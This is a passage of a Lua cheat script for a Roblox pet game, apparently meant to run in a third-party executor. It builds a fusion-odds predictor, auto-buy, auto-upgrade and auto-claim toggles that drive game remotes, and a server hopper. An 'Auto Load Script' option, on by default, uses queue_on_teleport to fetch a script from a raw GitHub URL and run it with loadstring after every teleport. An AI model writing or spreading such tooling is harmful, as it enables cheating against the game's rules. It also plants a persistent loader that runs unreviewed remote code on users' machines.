			if ok and type(result) == "number" then
				return result
			end
		end

		return math.exp(math.log((arg[1] + arg[2] + arg[3]) / 3) / 0.69314718055994529 * math.log((arg2 + arg3) / 2) / 0.69314718055994529 * 0.6)
	end

	local function fn20()
		local save = tbl.Save
		if type(save) ~= "table" or type(save.Get) ~= "function" then
			return nil
		end
		local ok, result = pcall(save.Get)
		if not ok or type(result) ~= "table" then
			return nil
		end
		local fusionSlots = type(result.FusionSlots) == "table" and result.FusionSlots or {}
		local inventory = type(result.Inventory) == "table" and result.Inventory or {}
		local tbl23 = {}

		for i = 1, 3 do
			local v13 = fusionSlots[i]
			local flag3 = v13 ~= nil and inventory[v13] or nil

			if type(flag3) == "table" then
				table.insert(tbl23, {
					Category = flag3.Category,
					Scale = tonumber(flag3.Scale) or 1,
					Mutations = type(flag3.Mutations) == "table" and flag3.Mutations or {},
				})
			end
		end

		return {
			Items = tbl23,
			Locked = result.FusionLocked == true,
			Duration = tonumber(result.FusionDuration) or 0,
			Reward = result.FusionEggReward ~= nil and result.FusionEggReward ~= false,
		}
	end

	local function fn21(arg)
		if string.upper(tostring(arg.Rarity)) == "SECRET" then
			return tbl12.SecretGradient
		end
		return arg.Gradient
	end

	local function fn22(arg)
		return fn21(arg) ~= nil and Color3.fromRGB(255, 255, 255) or arg.Color
	end

	local function fn23(arg)
		if string.upper(tostring(arg.Rarity)) == "SECRET" then
			return tbl12.SecretRotation
		end
		return nil
	end

	local function fn24(arg)
		v11 = arg
		arg:SetDock(5, { Gap = n12, DividerColor = Color3.fromRGB(170, 174, 184) })
		local v13 = arg:Dock()

		tbl18.Icon = arg:Image({
			Parent = v13,
			X = 0,
			Y = 0,
			Width = n4,
			Height = n4,
			Corner = 0.35,
			Background = "#000000",
			BackgroundTransparency = 0.26,
			StrokeThickness = n15,
			StrokeTransparency = 0,
			ZIndex = 8,
		})

		tbl18.Name = arg:Text({
			Parent = v13,
			X = n5,
			Y = 0,
			Height = n6,
			Scale = n7,
			Wrap = false,
			Gradient = tbl12.NameGradient,
			TextStrokeTransparency = 1,
			ZIndex = 9,
		})

		tbl18.Rarity = arg:Text({
			Parent = v13,
			X = n5,
			Y = 0,
			Height = n6,
			Scale = n8,
			Wrap = false,
			Font = tbl12.RarityFont,
			TextStrokeTransparency = 1,
			StrokeTransparency = 0.08,
			ZIndex = 9,
		})

		tbl18.Info = arg:Text({ Parent = v13, X = n5, Y = n6, Height = n4 - n6, Wrap = false, ZIndex = 9 })

		arg:OnResize(function(arg2, arg3, arg4)
			if arg3 == n19 and arg4 == n20 then
				return
			end
			n19 = arg3
			n20 = arg4
			n16 = arg3 / math.max(arg4, 1)
			n17 = arg4
			n24 = 2
			n18 = 0.9 / math.max(arg:TextSize(), 1)
			tbl18.Rarity.Set({ StrokeThickness = n18 })

			for _, v14 in ipairs(tbl19) do
				v14.Rarity.Set({ StrokeThickness = n18 })
			end
		end)
	end

	local function fn25(arg)
		local v13 = arg and arg.Get()
		if not v13 or n17 <= 0 then
			return nil
		end

		if v13.Text ~= tostring(arg.Spec.Text or "") then
			return nil
		end
		return v13
	end

	local function fn26(arg)
		local v13 = fn25(arg)
		if not v13 then
			return nil
		end
		local size = v13.Size
		local textWrapped = v13.TextWrapped
		v13.TextWrapped = false
		v13.Size = UDim2.fromOffset(100000, math.max(1, size.Y.Offset))
		local x = v13.TextBounds.X
		v13.Size = size
		v13.TextWrapped = textWrapped
		if x <= 0 then
			return nil
		end
		return x / n17
	end

	local function fn27(arg, arg2)
		local v13 = fn25(arg)
		if not v13 then
			return nil
		end
		local size = v13.Size
		v13.Size = UDim2.fromOffset(math.max(1, math.floor(arg2 * n17 + 0.5)), 100000)
		local y = v13.TextBounds.Y
		v13.Size = size
		if y <= 0 then
			return nil
		end
		return y / n17
	end

	local function fn28(arg)
		local v13 = tbl20[arg]

		if not v13 then
			local v14 = v11:Text({ Name = "Line", X = 0, Y = 0, Width = 1, Height = 1, Wrap = true, Visible = false })
			tbl20[arg] = v14
			v13 = v14
		end

		return v13
	end

	local function fn29(arg)
		local v13 = tbl19[arg]
		if v13 then
			return v13
		end

		local tbl23 = {
			Frame = v11:Frame({
				Name = "Slot",
				Background = "#000000",
				BackgroundTransparency = 0.74,
				Corner = 0.35,
				X = 0,
				Y = 0,
				Width = 1,
				Height = 1,
				Visible = false,
			}),
		}

		tbl23.Icon = v11:Image({
			Parent = tbl23.Frame,
			X = n10,
			Y = 0,
			Width = n9,
			Height = n9,
			Corner = 0.35,
			Background = "#000000",
			BackgroundTransparency = 0.45,
			StrokeThickness = n15,
			StrokeTransparency = 0,
		})

		tbl23.Name = v11:Text({
			Parent = tbl23.Frame,
			X = n10 + n13,
			Y = 0,
			Width = 1,
			Height = n6,
			Scale = n7,
			Wrap = false,
			Gradient = tbl12.NameGradient,
			TextStrokeTransparency = 1,
		})

		tbl23.Rarity = v11:Text({
			Parent = tbl23.Frame,
			X = n10 + n13,
			Y = 0,
			Width = 1,
			Height = n6,
			Scale = n8,
			Wrap = false,
			Font = tbl12.RarityFont,
			TextStrokeTransparency = 1,
			StrokeTransparency = 0.08,
			StrokeThickness = n18,
		})

		tbl23.Detail = v11:Text({
			Parent = tbl23.Frame,
			X = n10 + n13,
			Y = n6,
			Width = math.max(1, n16 - n13 - n10 * 2),
			Height = 1,
			Wrap = true,
		})

		tbl23.Status = v11:Text({
			Parent = tbl23.Frame,
			X = 0,
			Y = 0,
			Width = 1,
			Height = n6,
			Wrap = false,
			Align = "Right",
			Color = color2.Hint,
		})

		tbl19[arg] = tbl23
		return tbl23
	end

	local function fn30()
		if n16 <= 0 then
			return
		end
		flag2 = false
		local n25 = math.max(1, n16 - n5)
		local v13 = fn26(tbl18.Rarity)

		if v13 then
			n23 = v13 + 0.1
		else
			flag2 = true
		end

		local v14 = fn26(tbl18.Name)

		if v14 then
			n22 = math.min(v14 + 0.1, math.max(1, n25 - n23 - n14))
		else
			flag2 = true
		end

		tbl18.Name.Set({ X = n5, Y = 0, Width = n22, Height = n6 })

		tbl18.Rarity.Set({
			X = n5 + n22 + n14,
			Y = 0,
			Width = math.max(0.5, math.min(n23, n25 - n22 - n14)),
			Height = n6,
		})

		tbl18.Info.Set({ X = n5, Y = n6, Width = n25, Height = math.max(1, n4 - n6) })
		local n26 = math.max(1, n16 - n13 - n10 * 2)
		local n27 = 0

		for _, v15 in ipairs(tbl21) do
			if v15.Kind == "text" then
				local handle = v15.Handle
				local v16 = fn27(handle, n16)

				if v16 then
					v15.Height = v16
				else
					flag2 = true
				end

				local n28 = math.max(1, v15.Height or 1)
				handle.Set({ X = 0, Y = n27 + (v15.Gap and 0.5 or 0), Width = n16, Height = n28 })
				n27 += n28 + n12 * 0.5 + (v15.Gap and 0.5 or 0)
			else
				local slot = v15.Slot
				local v16 = fn27(slot.Detail, n26)

				if v16 then
					slot.DetailUnits = v16
				else
					flag2 = true
				end

				local n28 = math.clamp(slot.DetailUnits or 1, 1, 4)
				local v17 = fn26(slot.Status)

				if v17 then
					slot.StatusUnits = v17 + 0.23
				else
					flag2 = true
				end

				local n29 = math.min(n26 * 0.42, math.max(2.73, slot.StatusUnits or 2.73))
				local n30 = math.max(1, n26 - n29 - n14)
				local v18 = fn26(slot.Rarity)

				if v18 then
					slot.RarityUnits = v18 + 0.1
				else
					flag2 = true
				end

				local n31 = math.min(slot.RarityUnits or 3, n30 * 0.5)
				local v19 = fn26(slot.Name)

				if v19 then
					slot.NameUnits = v19 + 0.1
				else
					flag2 = true
				end

				local min = math.min
				local max = math.max
				local nameUnits = slot.NameUnits or 4
				local max2 = math.max
				local n32 = n30 - n31 - n14
				local v20 = min(max(1, nameUnits), max2(1, n32))
				local n33 = n11 * 2
				local n34 = math.max(n28 + n6, 2.3) + n33
				local n35 = (n34 - n28 - n6) / 2
				slot.Frame.Set({ X = 0, Y = n27, Width = n16, Height = n34 })
				slot.Icon.Set({ Y = (n34 - n9) / 2 })
				slot.Name.Set({ X = n10 + n13, Y = n35, Width = v20 })
				slot.Rarity.Set({ X = n10 + n13 + v20 + n14, Y = n35, Width = math.max(0.5, n31) })
				slot.Detail.Set({ X = n10 + n13, Y = n35 + n6, Width = n26, Height = n28 })
				slot.Status.Set({ X = n10 + n13 + n26 - n29, Y = n35, Width = math.max(0.5, n29) })
				n27 += n34 + n12
			end
		end

		local n28 = math.max(1, n27)

		if math.abs(n28 - n21) > 0.01 then
			n21 = n28
			v11:SetContentLines(n28)
		end
	end

	local function fn31(arg, arg2)
		local flag3 = arg ~= nil
		v11:SetDock(flag3 and 5 or 0, { Gap = n12 })
		tbl18.Icon.Set({ Visible = flag3 })
		tbl18.Name.Set({ Visible = flag3 })
		tbl18.Rarity.Set({ Visible = flag3 })
		tbl18.Info.Set({ Visible = flag3 })
		if not flag3 then
			return
		end
		tbl18.Icon.Set({ Visible = arg.Icon ~= nil, Image = arg.Icon or "", StrokeColor = arg.Color })
		tbl18.Name.Set({ Text = tbl12.Escape(arg.Name) })

		tbl18.Rarity.Set({
			Text = string.upper(tostring(arg.Rarity)),
			Color = fn22(arg),
			Gradient = fn21(arg),
			GradientRotation = fn23(arg),
		})

		local v13 = paint2(color2.Text, string.format("Fusing %d of 3 pets", #arg2.Items))

		if arg2.Reward then
			v13 = bold2(paint2(color2.Ready, "Fuse finished, claim your egg"))
		elseif arg2.Locked then
			local n25 = arg2.Duration > 1e9 and arg2.Duration - workspace:GetServerTimeNow() or 0
			v13 = bold2(paint2(color2.Clock, n25 > 0 and "Fusing" .. tbl12.Separator() .. tbl12.FormatClock(n25) or "Fusing"))
		end

		local set = tbl18.Info.Set
		local tbl23 = {}
		local concat = table.concat
		local tbl24 = {}
		local v14 = bold2(paint2(color2.Income, tbl12.FormatRate(tbl12.Income(arg, arg2.Items[1].Scale, arg2.Items[1].Mutations))))
		local v15 = paint2(color2.Text, string.format("%d/3 loaded", #arg2.Items))
		tbl24[1] = v14
		tbl24[2] = v15
		tbl24[3] = v13
		tbl23.Text = concat(tbl24, "\n")
		set(tbl23)
	end

	local function refreshFuse()
		if not v11 then
			return
		end
		n24 = 2
		table.clear(tbl21)
		local n25 = 0

		local function fn32(arg, arg2)
			n25 += 1
			local v13 = fn28(n25)
			v13.Set({ Visible = true, Text = arg })
			table.insert(tbl21, { Kind = "text", Handle = v13, Gap = arg2 })
		end

		local function fn33(arg, arg2)
			local flag3 = #tbl21 > 0
			fn32(string.format("<b><font color=\"%s\">%s</font></b>", arg2, arg), flag3)
		end

		local v13 = fn20()
		local n26

		if not v13 then
			fn31(nil, nil)
			fn32(bold2(paint2(color2.Hint, "Fuse machine data is not available yet")), false)
			n26 = 0
		elseif #v13.Items == 0 then
			fn31(nil, nil)
			fn32(bold2(paint2(color2.Text, "Machine is empty")), false)
			fn32(paint2(color2.Hint, "Load 3 pets of the same species to see the result odds"), false)
			n26 = 0
		else
			local items = v13.Items
			local v14 = tbl12.AssetInfo(items[1].Category)
			fn31(v14, v13)
			local text = color2.Text
			fn33(string.format("FUSE MACHINE STATUS (%d/3 PETS)", #items), text)
			fn32(paint2(color2.Hint, "Species") .. "  " .. bold2(paint2(v14.Hex, "[" .. string.upper(tostring(v14.Rarity)) .. "]")) .. " " .. bold2(paint2(color2.Text, tbl12.Escape(v14.Name))), false)
			n26 = 0

			for i = 1, 3 do
				local v15 = items[i]
				n26 += 1
				local v16 = fn29(n26)
				v16.Frame.Set({ Visible = true })
				v16.Status.Set({ Text = "SLOT " .. i })

				if v15 then
					v16.Icon.Set({ Visible = v14.Icon ~= nil, Image = v14.Icon or "", StrokeColor = v14.Color })
					v16.Name.Set({ Text = tbl12.Escape(v14.Name) })

					v16.Rarity.Set({
						Text = string.upper(tostring(v14.Rarity)),
						Color = fn22(v14),
						Gradient = fn21(v14),
						GradientRotation = fn23(v14),
					})

					local v17 = fn16(v15.Category, v15.Scale)
					local v18 = bold2(paint2(color2.Scale, string.format("%.2fx", v15.Scale)))

					if v17 then
						v18 ..= tbl12.Separator() .. paint2(color2.Weight, tbl12.FormatWeight(v17))
					end

					local str = v18 .. tbl12.Separator() .. bold2(paint2(color2.Income, tbl12.FormatRate(tbl12.Income(v14, v15.Scale, v15.Mutations))))
					local v19 = tbl12.MutationText(v15.Mutations)

					v16.Detail.Set({
						Text = str .. tbl12.Separator() .. (v19 ~= "" and v19 or paint2(color2.Hint, "Normal")),
					})
				else
					v16.Icon.Set({ Visible = false })
					v16.Name.Set({ Text = paint2(color2.Hint, "Empty") })
					v16.Rarity.Set({ Text = "", Gradient = nil })
					v16.Detail.Set({ Text = paint2(color2.Hint, "Add a pet to this slot") })
				end

				table.insert(tbl21, { Kind = "slot", Slot = v16 })
			end

			local n27 = 0

			for _, item in ipairs(items) do
				n27 += item.Scale
			end

			local n28 = n27 / #items
			local v15 = fn16(items[1].Category, n28)
			local str = paint2(color2.Hint, "Average Scale") .. "  " .. bold2(paint2(color2.Scale, string.format("%.2fx", n28)))

			if v15 then
				str ..= tbl12.Separator() .. paint2(color2.Weight, tbl12.FormatWeight(v15))
			end

			fn32(str, false)
			local v16 = nil

			for _, item in ipairs(items) do
				local v17 = fn17(item.Mutations)

				if v17 then
					if (v16 and tbl12.MutationMultiplier({ v16 }) or 0) < tbl12.MutationMultiplier({ v17 }) then
						v16 = v17
					end
				end
			end

			local tbl23 = v16 and { v16 } or {}
			fn33("PREDICTED SIZE PROBABILITIES", color2.Income)

			if #items == 3 then
				local tbl24 = { items[1].Scale, items[2].Scale, items[3].Scale }
				local tbl25 = {}
				local n29 = 0

				for _, v17 in ipairs(fn18()) do
					local n30 = v17.weight * fn19(tbl24, v17.min, v17.max)
					n29 += n30
					table.insert(tbl25, { Min = v17.min, Max = v17.max, Weight = n30, Color = fn15(v17.min) })
				end

				table.sort(tbl25, function(arg, arg2)
					return arg.Weight > arg2.Weight
				end)

				local v17 = tbl25[1]

				for _, v18 in ipairs(tbl25) do
					local n30 = n29 > 0 and v18.Weight / n29 * 100 or 0
					local v19 = bold2(paint2(v18.Color, string.format("%.2fx - %.2fx", v18.Min, v18.Max)))
					local v20 = fn16(items[1].Category, v18.Min)
					local v21 = fn16(items[1].Category, v18.Max)

					if v20 and v21 then
						local weight = color2.Weight
						local format = string.format
						local formatWeight = tbl12.FormatWeight
						v19 ..= tbl12.Separator() .. paint2(weight, format("%s - %s", tbl12.FormatWeight(v20), formatWeight(v21)))
					end

					fn32(v19 .. tbl12.Separator() .. bold2(paint2(n30 >= 10 and color2.Income or n30 >= 1 and color2.Clock or color2.Hint, string.format(n30 >= 1 and "%.1f%%" or "%.3f%%", n30))), false)
				end

				fn33("RESULT PREDICTION", color2.Text)
				fn32(paint2(color2.Hint, "Predicted Mutation") .. "  " .. (v16 and tbl12.MutationText(tbl23) or paint2(color2.Text, "Normal")), false)

				if v17 then
					fn32(paint2(color2.Hint, "Estimated Value") .. "  " .. bold2(paint2(color2.Income, tbl12.FormatRate(tbl12.Income(v14, v17.Min, tbl23)) .. " ~ " .. tbl12.FormatRate(tbl12.Income(v14, v17.Max, tbl23)))) .. tbl12.Separator() .. paint2(color2.Hint, "at ") .. bold2(paint2(v17.Color, string.format("%.2fx - %.2fx", v17.Min, v17.Max))), false)
				end

				local v18 = nil

				for _, v19 in ipairs(tbl25) do
					if not v18 or v19.Max > v18.Max then
						v18 = v19
					end
				end

				if v18 then
					fn32(paint2(color2.Hint, "Best Case") .. "  " .. bold2(paint2(v18.Color, string.format("%.2fx - %.2fx", v18.Min, v18.Max))) .. "  " .. bold2(paint2(color2.Income, tbl12.FormatRate(tbl12.Income(v14, v18.Max, tbl23)))), false)
				end
			else
				fn32(paint2(color2.Hint, string.format("Load %d more of the same species to see the odds", 3 - #v13.Items)), false)
			end
		end

		for i = n25 + 1, #tbl20 do
			tbl20[i].Set({ Visible = false })
		end

		for i = n26 + 1, #tbl19 do
			tbl19[i].Frame.Set({ Visible = false })
		end

		fn30()
		n24 = 2
	end

	if not tbl12.Ready then
		v9:CreateText({ Name = "Fuse Predictor", Text = "Update the Chilli Library to use the predictor canvas." })
	else
		local v13 = v9:CreateCanvas({
			Name = "Fuse Predictor",
			Layout = "free",
			Style = {
				TextScale = 0.84,
				LineHeight = 1.1,
				MinLines = 16,
				MaxLines = 34,
				BackgroundTransparency = 0.5,
				ScrollBarColor = Color3.fromRGB(170, 174, 184),
				TextColor = Color3.fromRGB(255, 255, 255),
				TextStrokeTransparency = 0.7,
			},
			Build = function(arg)
				fn24(arg)

				if type(tbl12.RequestEggRefresh) == "function" then
					tbl12.RequestEggRefresh()
				end
			end,
		})

		tbl12.RefreshFuse = refreshFuse

		tbl12.PlaceFuse = function()
			if n24 > 0 or flag2 then
				if n24 > 0 then
					n24 -= 1
				end

				pcall(fn30)
			end
		end

		fn4(function()
			v13:Destroy()
		end)
	end
end

local v11
v11 = v2:CreateTab({ Name = "Progress", SectionsExpanded = true }):CreateSection({ Name = "Auto Progression", Expanded = true })

do
	local tbl17 = {}
	local tbl18

	tbl18 = {
		Remote = function(arg)
			local v12 = tbl17[arg]
			if v12 ~= nil then
				return v12 or nil
			end
			local v13 = networking:FindFirstChild(arg)
			tbl17[arg] = v13 or false
			return v13
		end,
		Invoke = function(arg, ...)
			local v12 = tbl18.Remote(arg)
			if not v12 or not v12:IsA("RemoteFunction") then
				return false, nil
			end
			local ok, result = pcall(v12.InvokeServer, v12, ...)
			return ok, result
		end,
		Fire = function(arg, ...)
			local v12 = tbl18.Remote(arg)
			if not v12 or not v12:IsA("RemoteEvent") then
				return false
			end
			return pcall(v12.FireServer, v12, ...)
		end,
	}

	local function saveData()
		local save = tbl.Save
		if type(save) ~= "table" or type(save.Get) ~= "function" then
			return nil
		end
		local ok, result = pcall(save.Get)
		return ok and type(result) == "table" and result or nil
	end

	tbl18.SaveData = saveData
	local tbl19 = { "Money", "Cash", "Coins", "Currency", "Balance" }

	tbl18.Money = function()
		local v12 = saveData()

		if v12 then
			for _, v13 in ipairs(tbl19) do
				local num = tonumber(v12[v13])
				if num then
					return num
				end
			end
		end

		local leaderstats = localPlayer:FindFirstChild("leaderstats")

		if leaderstats then
			for _, v13 in ipairs(tbl19) do
				local v14 = leaderstats:FindFirstChild(v13)
				if v14 and tonumber(v14.Value) then
					return tonumber(v14.Value)
				end
			end
		end

		return nil
	end

	tbl18.AddWorker = tbl3.Add
	tbl18.Backoff = tbl3.Backoff

	local tbl20 = {
		"Money",
		"BaseUpgradeLevel",
		"TreadmillUpgradeLevel",
		"TrailInventory",
		"PendingOfflineMoney",
	}

	local save = tbl.Save

	if type(save) == "table" and type(save.FieldSignal) == "function" then
		for _, v12 in ipairs(tbl20) do
			local ok, result = pcall(save.FieldSignal, v12)

			if ok and type(result) == "table" and type(result.Connect) == "function" then
				local ok2, result2 = pcall(result.Connect, result, function()
					tbl3.Wake()
				end)

				if ok2 and result2 then
					fn4(function()
						pcall(function()
							result2:Disconnect()
						end)
					end)
				end
			end
		end
	end

	local v12 = nil
	local v13 = nil
	local tbl21 = {}

	local function fn15()
		local v14 = fn2(function()
			return ReplicatedStorage.Data.Trails
		end)

		local directory = type(v14) == "table" and v14.Directory or nil
		if type(directory) ~= "table" then
			return {}
		end
		local tbl22 = {}

		for k, v15 in pairs(directory) do
			if type(v15) == "table" then
				table.insert(tbl22, { Id = tostring(v15._id or k), Price = tonumber(v15.Price) or math.huge })
			end
		end

		table.sort(tbl22, function(arg, arg2)
			return arg.Price < arg2.Price
		end)

		return tbl22
	end

	local function fn16(arg)
		if not tbl6.ReadToggle(v12, false) then
			return false
		end
		v13 = v13 or fn15()
		local v14 = tbl18.SaveData()
		if not v14 or #v13 == 0 then
			return false
		end
		local trailInventory = type(v14.TrailInventory) == "table" and v14.TrailInventory or {}
		local n13 = tonumber(v14.Money) or 0

		for _, v15 in ipairs(v13) do
			if trailInventory[v15.Id] ~= true and not tbl21[v15.Id] and v15.Price <= n13 then
				local AskPurchase, v16 = tbl18.Invoke("RF/Trailwear/AskPurchase", v15.Id)
				if AskPurchase and v16 ~= false then
					return true
				end
				tbl21[v15.Id] = true
				tbl18.Backoff(arg)
				return false
			end
		end

		return false
	end

	v12 = v11:CreateToggle({
		Name = "Auto Buy Trail",
		Note = "Automatically buy available trails when affordable",
		Default = false,
		Callback = function()
			table.clear(tbl21)
			v13 = nil
		end,
	})

	tbl18.AddWorker(fn16)
	local v14 = nil

	local function fn17()
		if not tbl6.ReadToggle(v14, false) then
			return false
		end
		local v15 = tbl18.SaveData()
		if not v15 then
			return false
		end

		local v16 = fn2(function()
			return ReplicatedStorage.Data.Bases
		end)

		local bases = type(v16) == "table" and v16.BASES or nil
		if type(bases) ~= "table" then
			return false
		end
		local n13 = tonumber(v15.BaseUpgradeLevel) or 0
		local ok = nil

		if type(v16.GetMaxBaseLevel) == "function" then
			local result
			ok, result = pcall(v16.GetMaxBaseLevel)
			ok = ok and tonumber(result) or nil
		end

		if ok and n13 >= ok then
			return false
		end
		local v17 = bases[n13 + 1]
		local num = type(v17) == "table" and tonumber(v17.Cost) or nil

		if num then
			num = (tonumber(v15.Money) or 0) >= num
		end

		if num then
			return tbl18.Fire("RE/Homestead/AskBaseTierRaise")
		end
		return false
	end

	v14 = v11:CreateToggle({
		Name = "Auto Upgrade Base",
		Note = "Automatically upgrade base when money is available",
		Default = false,
	})

	tbl18.AddWorker(fn17)
	local v15 = nil

	local function fn18()
		if not tbl6.ReadToggle(v15, false) then
			return false
		end
		local v16 = tbl18.SaveData()
		if not v16 then
			return false
		end

		local v17 = fn2(function()
			return ReplicatedStorage.Data.Treadmills
		end)

		if type(v17) ~= "table" or type(v17.GetByUpgradeLevel) ~= "function" then
			return false
		end
		local ok, result = pcall(v17.GetByUpgradeLevel, (tonumber(v16.TreadmillUpgradeLevel) or 0) + 1)
		if not ok or type(result) ~= "table" then
			return false
		end
		local id = result._id
		local huge = tonumber(result.Price) or math.huge
		local flag2 = type(id) == "string"

		if flag2 then
			flag2 = (tonumber(v16.Money) or 0) >= huge
		end

		if flag2 then
			local AskTierRaise, v18 = tbl18.Invoke("RF/Treadmill/AskTierRaise", id)
			return AskTierRaise and v18 ~= false
		end
		return false
	end

	v15 = v11:CreateToggle({
		Name = "Auto Upgrade Treadmill",
		Note = "Automatically upgrade treadmill when money is available",
		Default = false,
	})

	tbl18.AddWorker(fn18)
	local n13 = 15
	local v16 = nil
	local n14 = 15
	local now = os.clock()

	local function fn19()
		if not tbl6.ReadToggle(v16, false) then
			return false
		end
		local now2 = os.clock()
		n14 += now2 - now
		now = now2
		local num = tbl18.SaveData()
		num = num and tonumber(num.PendingOfflineMoney) or nil

		if num == nil then
			local v17
			num, v17 = tbl18.Invoke("RF/AwayEarnings/PendingCheck")
			num = num and v17 ~= false and v17 ~= nil and 1 or 0
		end

		local flag2 = false

		if num > 0 then
			local AskCollect, v17 = tbl18.Invoke("RF/AwayEarnings/AskCollect")
			flag2 = AskCollect and v17 ~= false
		end

		if n13 <= n14 then
			n14 = 0
			local AskRedeemAll, v17 = tbl18.Invoke("RF/Codex/AskRedeemAll")
			flag2 = flag2 or AskRedeemAll and v17 ~= false
			tbl18.Invoke("RF/Codex/AskRedeemLimitedEgg")
		end

		return flag2
	end

	v16 = v11:CreateToggle({
		Name = "Auto Claim",
		Note = "Claim offline money & index rewards",
		Default = false,
		Callback = function()
			n14 = n13
		end,
	})

	tbl18.AddWorker(fn19)
end

tbl4.IndexClaimHandle = v11:CreateToggle({
	Name = "Auto Claim Index",
	Note = "Claim index rewards as soon as they unlock",
	Default = false,
	Callback = function()
		if type(tbl4.IndexClaimRestart) == "function" then
			tbl4.IndexClaimRestart()
		end
	end,
})

local fn15

fn15 = function(arg, arg2)
	if type(v.Notify) == "function" then
		pcall(v.Notify, arg, arg2, 5)
	end
end

local v12
v12 = v2:CreateTab({ Name = "Server", SectionsExpanded = true }):CreateSection({ Name = "Server", Expanded = true })
local TeleportService
TeleportService = game:GetService("TeleportService")
local HttpService
HttpService = game:GetService("HttpService")
local GuiService
GuiService = game:GetService("GuiService")

do
	local function fn16()
		if type(queue_on_teleport) == "function" then
			return queue_on_teleport
		end

		if type(queueonteleport) == "function" then
			return queueonteleport
		end

		if type(syn) == "table" and type(syn.queue_on_teleport) == "function" then
			return syn.queue_on_teleport
		end

		if type(fluxus) == "table" and type(fluxus.queue_on_teleport) == "function" then
			return fluxus.queue_on_teleport
		end
		return nil
	end

	local function fn17(arg)
		pcall(function()
			TeleportService:SetTeleportSetting("__ChilliAutoLoadScriptEnabled", arg)
		end)

		if not arg then
			return true
		end
		local v13 = fn16()
		if not v13 then
			return false
		end

		if rawget(_G, "__ChilliAutoLoadQueued") ~= true then
			if not pcall(v13, [[local TeleportService = game:GetService("TeleportService")
local enabled = true
pcall(function()
    enabled = TeleportService:GetTeleportSetting("__ChilliAutoLoadScriptEnabled") == true
end)
if enabled then
    if not game:IsLoaded() then
        game.Loaded:Wait()
    end
    pcall(function()
        local player = game:GetService("Players").LocalPlayer
        if player and not player.Character then
            player.CharacterAdded:Wait()
        end
    end)
    task.wait(1.5)
    local ok, source = pcall(function()
        return game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua")
    end)
    if ok and type(source) == "string" then
        local chunk = loadstring(source)
        if chunk then
            chunk()
        end
    end
end
]]) then
				return false
			end

			_G.__ChilliAutoLoadQueued = true
		end

		return true
	end

	local v13 = nil

	local function fn18()
		if v13 and tbl4.Toggle(v13, false) then
			fn17(true)
		end
	end

	v13 = v12:CreateToggle({
		Name = "Auto Load Script",
		Default = true,
		Callback = function(arg)
			local flag2 = arg == true

			if not fn17(flag2) and flag2 then
				task.defer(function()
					fn17(false)

					if v13 and type(v13.Set) == "function" then
						pcall(v13.Set, v13, false, false)
					end

					fn15("Auto Load Unavailable", "This executor does not support queue on teleport.")
				end)
			end
		end,
	})

	local str = "Least Players"
	local n13 = 10
	local n14 = 0
	local v14 = nil
	local tbl17 = {}
	local flag2 = false
	local n15 = 0
	local flag3 = false
	local v15 = nil
	local str2 = ""
	local n16 = 0
	local n17 = 60

	local function fn19(arg)
		n14 = 0
		v14 = nil

		if arg then
			tbl17[arg] = true
		end
	end

	pcall(function()
		TeleportService.TeleportInitFailed:Connect(function(arg, arg2, arg3)
			if not v14 then
				return
			end
			fn19(v14)
			flag3 = true

			if not flag2 then
				fn15("Server Hop Failed", tostring(arg3 ~= "" and arg3 or arg2))
			end
		end)
	end)

	local function fn20(arg)
		local str3 = tostring(game.JobId or "")
		local tbl18 = {}
		local flag4 = arg == "Random"
		local str4 = arg == "Least Players" and "Asc" or "Desc"
		local n18 = flag4 and 3 or 6
		local nextPageCursor = nil

		for i = 1, n18 do
			local str5 = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=%s&excludeFullGames=true&limit=100", game.PlaceId, str4)

			if nextPageCursor and nextPageCursor ~= "" then
				str5 ..= "&cursor=" .. HttpService:UrlEncode(nextPageCursor)
			end

			local ok, result = pcall(function()
				return HttpService:JSONDecode(game:HttpGet(str5))
			end)

			if not ok or type(result) ~= "table" then
				return tbl18, false
			end
			local v16 = ipairs
			local data = result.data or {}

			for _, v17 in v16(data) do
				local str6 = tostring(v17.id or "")
				local huge = tonumber(v17.playing) or math.huge
				local n19 = tonumber(v17.maxPlayers) or 0

				if str6 ~= "" and str6 ~= str3 and huge < n19 then
					tbl18[#tbl18 + 1] = { Id = str6, Playing = huge, Room = n19 - huge }
				end
			end

			if #tbl18 > 0 and not flag4 then
				break
			end
			nextPageCursor = result.nextPageCursor
			if not nextPageCursor or nextPageCursor == "" then
				break
			end
		end

		return tbl18, true
	end

	local function serverHop(arg)
		local v16

		if v15 and str2 == arg and os.clock() - n16 < n17 then
			v16 = v15
		else
			local v17
			v16, v17 = fn20(arg)
			if not v17 then
				return "fetch"
			end
			v15 = v16
			str2 = arg
			n16 = os.clock()
		end

		local function fn21(arg2)
			local tbl18 = {}

			for _, v17 in ipairs(v16) do
				if not tbl17[v17.Id] and v17.Room >= arg2 then
					tbl18[#tbl18 + 1] = v17
				end
			end

			return tbl18
		end

		local v17 = fn21(2)

		if #v17 == 0 then
			v17 = fn21(1)
		end

		if #v17 == 0 and next(tbl17) ~= nil then
			table.clear(tbl17)
			v17 = fn21(1)
		end

		if #v17 == 0 then
			fn19(nil)
			v15 = nil
			return "empty"
		end

		local id

		if arg == "Random" then
			id = v17[math.random(1, #v17)].Id
		else
			table.sort(v17, function(arg2, arg3)
				if arg == "Least Players" then
					return arg2.Playing < arg3.Playing
				end
				return arg2.Playing > arg3.Playing
			end)

			id = v17[1].Id
		end

		flag3 = false
		v14 = id
		n14 = os.clock() + n13
		pcall(fn18)

		if not pcall(function()
			TeleportService:TeleportToPlaceInstance(game.PlaceId, id, localPlayer)
		end) then
			fn19(id)
			return "failed"
		end

		local n18 = os.clock() + n13

		while os.clock() < n18 do
			if flag3 then
				return "denied"
			end
			task.wait(0.25)
		end

		return "waiting"
	end

	tbl4.ServerHop = serverHop

	v12:CreateDropdown({
		Name = "Server Hop Mode",
		Options = { "Most Players", "Random", "Least Players" },
		Default = "Least Players",
		Callback = function(arg)
			str = tostring(arg or "Least Players")
		end,
	})

	v12:CreateButton({
		Name = "Server Hop",
		ButtonText = "Hop",
		Callback = function()
			n15 += 1
			local v16 = n15

			task.spawn(function()
				flag2 = true
				local n18 = 0

				while v16 == n15 do
					n18 += 1
					local v17 = serverHop(str)

					if not (v17 == "waiting" or v16 ~= n15) then
						if v17 == "empty" then
							v15 = nil
							table.clear(tbl17)
						end

						if n18 % 10 == 0 then
							fn15("Server Hop", string.format("Every server was full so far, %d tries.", n18))
						end

						task.wait(v17 == "fetch" and 1 or 0.1)
						continue
					end

					break
				end

				if v16 == n15 then
					flag2 = false
				end
